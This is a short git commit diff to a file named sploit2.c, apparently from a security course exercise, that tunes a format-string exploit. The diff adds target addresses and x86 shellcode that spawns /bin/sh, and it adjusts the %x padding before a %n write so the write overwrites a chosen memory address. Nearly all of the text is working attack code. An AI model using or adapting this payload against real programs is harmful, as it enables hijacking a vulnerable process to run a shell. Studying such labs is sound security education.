91154fb4ceb504f3ba8f647847e7627d874cba30
shangzw <shangzw12@163.com>
2016-10-05 22:03:57 -0400

    use catch

--- s2/sploit2.c
+++ s2/sploit2.c
@@ -11,6 +11,8 @@ int main(){
   	char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
 	char p_cmd[] = "PPP"
 			"1111" "\x5c\xda\xbf\xff"
+			"1111" "\x5e\xda\xbf\xff"
+			"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
@@ -22,7 +24,7 @@ int main(){
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
-			"%08x.%08x.%08x.%08x.%n";
+			"%08x.%08x.%08x.%55299x.%n";
 	char* cmd = (char*)malloc(1000);
 	p_cmd_len = strlen(p_cmd);
 	strcpy(cmd, p_cmd);
